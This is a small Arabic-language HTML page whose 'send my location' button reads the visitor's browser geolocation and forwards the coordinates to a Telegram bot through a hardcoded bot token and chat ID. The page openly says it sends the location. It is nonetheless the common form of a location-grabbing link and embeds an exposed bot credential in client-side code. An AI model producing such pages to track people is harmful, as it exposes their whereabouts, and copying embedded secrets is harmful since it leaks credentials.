<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>فتح موقع صفحة الهبوط</title>
</head>
<body style="text-align:center; font-family:Arial">

<h2>📍 اضغط الزر لمشاركة موقعك</h2>
<button onclick="getLocation()" style="padding:10px 20px; font-size:18px;">إرسال موقعي</button>

<p id="status"></p>

<script>
const BOT_TOKEN = "5814823361:AAEFNHuJtnAq_3M51YQPwylzyDsnOnSUOjQ";
const CHAT_ID = "143914927";

function getLocation() {
    if (navigator.geolocation) {
        document.getElementById("status").innerText = "جارٍ تحديد موقعك...";
        navigator.geolocation.getCurrentPosition(sendLocation, showError);
    } else {
        alert("المتصفح لا يدعم تحديد الموقع");
    }
}

function sendLocation(position) {
    const lat = position.coords.latitude;
    const lon = position.coords.longitude;

    document.getElementById("status").innerText = `تم الحصول على الموقع: ${lat}, ${lon}`;

    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendLocation?chat_id=${CHAT_ID}&latitude=${lat}&longitude=${lon}`;

    fetch(url)
        .then(response => {
            if (response.ok) {
                document.getElementById("status").innerText = "✅ تم إرسال الموقع إلى البوت";
            } else {
                document.getElementById("status").innerText = "❌ فشل إرسال الموقع";
            }
        })
        .catch(() => {
            document.getElementById("status").innerText = "⚠ حدث خطأ أثناء الإرسال";
        });
}

function showError(error) {
    switch(error.code) {
        case error.PERMISSION_DENIED:
            alert("❌ رفضت مشاركة الموقع");
            break;
        case error.POSITION_UNAVAILABLE:
            alert("⚠ الموقع غير متاح");
            break;
        case error.TIMEOUT:
            alert("⏳ انتهى وقت تحديد الموقع");
            break;
        default:
            alert("❌ خطأ غير معروف");
            break;
    }
}
</script>

</body>
</html>
